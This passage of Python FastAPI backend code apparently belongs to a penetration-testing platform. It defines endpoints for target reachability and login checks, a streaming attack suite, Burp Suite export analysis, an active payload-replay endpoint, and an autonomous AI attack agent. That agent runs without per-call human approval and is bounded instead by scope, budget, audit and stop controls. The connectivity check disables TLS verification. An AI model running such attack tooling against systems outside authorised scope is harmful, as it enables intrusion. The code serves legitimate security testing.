    result: dict = {"reachable": False, "auth_success": False, "auth_type": None,
                    "tech_stack": [], "status_code": None, "error": None}
    headers = dict(payload.auth_headers)
    headers.setdefault("User-Agent", "AttackTrace-Security-Scanner/2.0")
    _timeout = httpx.Timeout(connect=4.0, read=10.0, write=10.0, pool=5.0)
    try:
        async with httpx.AsyncClient(headers=headers, timeout=_timeout,
                                      follow_redirects=True, verify=False) as client:
            r = await client.head(payload.target, timeout=httpx.Timeout(connect=4.0, read=5.0, write=5.0, pool=5.0))
            result["reachable"] = True
            result["status_code"] = r.status_code
            # Fingerprint
            cr = CrawlResult()
            _fingerprint(r, cr)
            result["tech_stack"] = cr.tech_stack
            # Test auth
            if payload.login.enabled:
                auth_result = await _perform_login(client, payload.login, payload.target)
                auth_result.pop("__login_debug__", None)
                auth_result.pop("__cookie_header__", None)
                cookies_to_set = {}
                if "__cookies__" in auth_result:
                    cookies_to_set = auth_result.pop("__cookies__")
                if auth_result or cookies_to_set:
                    result["auth_success"] = True
                    result["auth_type"] = list(auth_result.keys())[0] if auth_result else "cookie"
                else:
                    result["auth_success"] = False
                    result["error"] = "Login attempt returned no auth credentials"
    except httpx.ConnectError as e:
        result["error"] = f"Connection refused: {e}"
    except httpx.ConnectTimeout:
        result["error"] = "Connection timed out"
    except Exception as e:
        result["error"] = str(e)
    return result


@router.post("/scan")
async def run_attack_suite(
    payload: AttackSuiteRequest,
    current_user: Annotated[User, Depends(require_tool("attack_suite"))],
    org_id: UUID = Depends(get_current_org_id),
    db: AsyncSession = Depends(get_db),
) -> StreamingResponse:
    from app.services.ai_service import get_org_ai_config
    ai_config = await get_org_ai_config(org_id, db)
    scan_id = str(uuid.uuid4())
    from app.services.scan_activity import tee_scan_activity
    return StreamingResponse(
        tee_scan_activity(org_id, "attack_suite", payload.target, scan_id, _stream_attack_suite(scan_id, payload, org_id, db=db, ai_config=ai_config)),
        media_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "Connection": "keep-alive",
                 "X-Accel-Buffering": "no"},
    )


@router.get("/scans")
async def list_attack_scans(
    current_user: Annotated[User, Depends(get_current_user)],
    org_id: UUID = Depends(get_current_org_id),
) -> dict:
    scans = sorted(
        (s for s in _scan_history.values() if s.get("org_id") == str(org_id)),
        key=lambda s: s.get("started_at", ""), reverse=True,
    )
    return {"items": scans, "total": len(scans)}


@router.get("/scans/{scan_id}")
async def get_attack_scan(
    scan_id: str,
    current_user: Annotated[User, Depends(get_current_user)],
    org_id: UUID = Depends(get_current_org_id),
) -> dict:
    scan = _scan_history.get(scan_id)
    if not scan or scan.get("org_id") != str(org_id):
        raise HTTPException(status_code=404, detail="Scan not found")
    return scan


@router.get("/modules")
async def list_modules(
    current_user: Annotated[User, Depends(get_current_user)],
) -> dict:
    return {"modules": MODULES_META}


# ─── Burp Suite analyser ──────────────────────────────────────────────────────

@router.post("/burp/analyze")
async def analyze_burp_file(
    file: UploadFile = File(...),
    ai_analysis: bool = Form(default=True),
    current_user: Annotated[User, Depends(require_tool("burp_analyzer"))] = None,
    org_id: UUID = Depends(get_current_org_id),
    db: AsyncSession = Depends(get_db),
) -> StreamingResponse:
    """
    Upload a Burp Suite HTTP History XML export and receive a streaming SSE
    analysis: parsed stats → endpoint profiles → response findings →
    per-endpoint test cases → Claude AI insights → completion summary.

    Export from Burp: Proxy → HTTP history → Ctrl-A → Right-click → Save items
    """
    from app.api.v1.burp_analyzer import run_burp_analysis  # local import avoids circular deps
    from app.services.ai_service import get_org_ai_config

    content = await file.read()
    if len(content) > 500 * 1024 * 1024:
        raise HTTPException(status_code=413, detail="File too large — maximum 500 MB")

    ai_config = await get_org_ai_config(org_id, db)

    return StreamingResponse(
        run_burp_analysis(
            content, ai_analysis, ai_config,
            org_id=str(org_id),
            filename=file.filename or "burp_history.xml",
        ),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "X-Accel-Buffering": "no",
        },
    )


@router.get("/burp/history")
async def list_burp_history(
    current_user: Annotated[User, Depends(require_tool("burp_analyzer"))] = None,
    org_id: UUID = Depends(get_current_org_id),
):
    """List all saved Burp analysis runs for this org."""
    from app.api.v1.burp_analyzer import _list_burp_history
    return _list_burp_history(str(org_id))


@router.get("/burp/history/{analysis_id}")
async def get_burp_analysis_detail(
    analysis_id: str,
    current_user: Annotated[User, Depends(require_tool("burp_analyzer"))] = None,
    org_id: UUID = Depends(get_current_org_id),
):
    """Retrieve full results of a past Burp analysis."""
    from app.api.v1.burp_analyzer import _get_burp_analysis
    data = _get_burp_analysis(str(org_id), analysis_id)
    if not data:
        raise HTTPException(status_code=404, detail="Analysis not found")
    return data


@router.delete("/burp/history/{analysis_id}")
async def delete_burp_analysis(
    analysis_id: str,
    current_user: Annotated[User, Depends(require_tool("burp_analyzer"))] = None,
    org_id: UUID = Depends(get_current_org_id),
):
    """Delete a saved Burp analysis."""
    from app.api.v1.burp_analyzer import _delete_burp_analysis
    if not _delete_burp_analysis(str(org_id), analysis_id):
        raise HTTPException(status_code=404, detail="Analysis not found")
    return {"deleted": True}


@router.post("/burp/verify")
async def verify_burp_test_case(
    request: Request,
    current_user: Annotated[User, Depends(require_tool("burp_analyzer"))] = None,
):
    """
    Active replay: inject a payload into a real request and confirm whether
    the finding is real. verify_ssl defaults to True; set to False only for
    targets with self-signed certificates in controlled lab environments.
    """
    from app.api.v1.burp_analyzer import verify_request
    body = await request.json()
    return await verify_request(
        endpoint_str=body.get("endpoint", ""),
        method=body.get("method", "GET"),
        vuln_type=body.get("vuln_type", ""),
        param=body.get("param", ""),
        payload=body.get("payload", ""),
        inject_in=body.get("inject_in", "query"),
        body_params=body.get("body_params", {}),
        auth_headers=body.get("auth_headers", {}),
        original_status=body.get("original_status", 200),
        req_timeout=min(int(body.get("timeout", 10)), 30),
        verify_ssl=bool(body.get("verify_ssl", True)),
    )


# ── AI Agent mode: real tool-use, autonomous within scope ─────────────────────


# Provider-aware budget ceilings for the autonomous agent. Claude API calls
# cost real money per token, so that ceiling stays conservative regardless of
# what's requested. A self-hosted model (Qwen) has no per-call cost — the
# ceiling there is a generous backstop against a genuinely stuck/looping
# process, not a cost control, so it's far higher.
_AGENT_BUDGET_CEILING = {
    "anthropic": {"turns": 40, "seconds": 900},
    "qwen": {"turns": 500, "seconds": 24 * 3600},
}


class AttackAgentRunRequest(BaseModel):
    target: str
    objective: Optional[str] = None
    max_turns: int = 20
    max_seconds: int = 480

    @field_validator("max_turns")
    @classmethod
    def _sanity_turns(cls, v: int) -> int:
        # Wide sanity bound only — the real, provider-aware ceiling is applied
        # in run_attack_agent() once the org's actual provider is known.
        return max(1, min(v, 2000))

    @field_validator("max_seconds")
    @classmethod
    def _sanity_seconds(cls, v: int) -> int:
        return max(30, min(v, 7 * 24 * 3600))


async def _stream_attack_agent(payload: AttackAgentRunRequest, org_id: UUID, user_id: UUID, ai_config: dict, db: AsyncSession) -> AsyncGenerator[str, None]:
    from app.services.attack_agent import run_agent
    async for event in run_agent(
        db, org_id, user_id, payload.target, objective=payload.objective,
        ai_config=ai_config, max_turns=payload.max_turns, max_seconds=payload.max_seconds,
    ):
        yield _sse(event["event"], event["data"])


@router.post("/agent/run")
async def run_attack_agent(
    payload: AttackAgentRunRequest,
    current_user: Annotated[User, Depends(require_tool("attack_suite"))],
    org_id: UUID = Depends(get_current_org_id),
    db: AsyncSession = Depends(get_db),
) -> StreamingResponse:
    """Run the autonomous, real tool-use AI agent against an in-scope target.

    No per-tool-call human approval — scope enforcement (target must already
    be a known org Asset), a fixed non-destructive tool envelope, a bounded
    turn/time budget, and a full AuditLog trail are the compensating controls.
    Stream stops safely on POST /attack-suite/agent/{run_id}/stop.
    """
    from app.services.ai_service import get_org_ai_config
    ai_config = await get_org_ai_config(org_id, db)

    ceiling = _AGENT_BUDGET_CEILING.get(ai_config.get("provider", "anthropic"), _AGENT_BUDGET_CEILING["anthropic"])
    payload.max_turns = min(payload.max_turns, ceiling["turns"])
    payload.max_seconds = min(payload.max_seconds, ceiling["seconds"])

    return StreamingResponse(
        _stream_attack_agent(payload, org_id, current_user.id, ai_config, db),
        media_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "Connection": "keep-alive",
                 "X-Accel-Buffering": "no"},
    )


@router.post("/agent/{run_id}/stop")
async def stop_attack_agent(
    run_id: str,
    current_user: Annotated[User, Depends(require_tool("attack_suite"))],
    org_id: UUID = Depends(get_current_org_id),
) -> dict:
    from app.services.attack_agent import get_run_status, stop_run
    status_info = await get_run_status(run_id)
    if status_info is None or status_info.get("org_id") != str(org_id):
        raise HTTPException(status_code=404, detail="Agent run not found")
    await stop_run(run_id)
    return {"run_id": run_id, "stopping": True}


@router.get("/agent/{run_id}")
async def get_attack_agent_status(
    run_id: str,
    current_user: Annotated[User, Depends(get_current_user)],
    org_id: UUID = Depends(get_current_org_id),
) -> dict:
    from app.services.attack_agent import get_run_status
    status_info = await get_run_status(run_id)
    if status_info is None or status_info.get("org_id") != str(org_id):
        raise HTTPException(status_code=404, detail="Agent run not found")
    return status_info
